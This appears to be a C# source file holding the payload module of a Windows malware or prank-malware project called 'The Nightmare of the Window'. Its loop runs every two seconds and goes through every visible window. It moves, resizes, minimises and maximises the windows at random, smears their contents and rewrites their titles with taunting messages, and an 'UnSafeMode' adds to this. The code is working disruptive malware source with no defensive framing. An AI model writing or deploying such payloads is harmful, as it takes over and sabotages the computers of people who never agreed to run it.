using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static The_Nightmare_of_the_Window.function;
using static The_Nightmare_of_the_Window.api;

namespace The_Nightmare_of_the_Window
{
    internal class Payloads_of_window
    {
        public static bool ECWProc(IntPtr hwnd, bool lParam)
        {
            SetWindowTextW(hwnd, "I am very regretful.");
            RECT rc;
            GetWindowRect(hwnd, out rc);
            MoveWindow(hwnd, rc.left + Randint(-5, 5), rc.top + Randint(-5, 5), rc.right - rc.left, rc.bottom - rc.top, true);
            return true;
        }
        public static bool EWProc(IntPtr hwnd, bool lParam)
        {
            if (IsWindowVisible(hwnd))
            {
                if (Randint(0, 5) == 0)
                    SetForegroundWindow(hwnd);
                SetWindowPos(hwnd, IntPtr.Zero, RandX(), RandY(), 0, 0, 21);
                RECT rc;
                GetWindowRect(hwnd, out rc);
                IntPtr hdc = GetWindowDC(hwnd);
                StretchBlt(hdc, 0, 0, ScrWidth, ScrHeight, hdc, rc.left, rc.top, (rc.right - rc.left), (rc.bottom - rc.top), TernaryRasterOperations.SRCCOPY);
                ReleaseDC(hwnd, hdc);
                switch (Randint(1, 3))
                {
                    case 1:
                        SendMessage(hwnd, WM_SYSCOMMAND, (IntPtr)SC_MINIMIZE, IntPtr.Zero);
                        break;
                    case 2:
                        SendMessage(hwnd, WM_SYSCOMMAND, (IntPtr)SC_MAXIMIZE, IntPtr.Zero);
                        break;
                    case 3:
                        SendMessage(hwnd, WM_SYSCOMMAND, (IntPtr)SC_RESTORE, IntPtr.Zero);
                        break;
                }
                if (Variables.UnSafeMode)
                {
                    SetWindowTextW(hwnd, "Window said: Having fun?");
                    EnumChildWindows(hwnd, ECWProc, IntPtr.Zero);
                }
            }
            return true;
        }
        public static void Window_Start()
        {
            int delaytime = 2000;
            while (true)
            {
                EnumWindows(EWProc, IntPtr.Zero);
                Sleep(delaytime);
            }
        }
    }
}
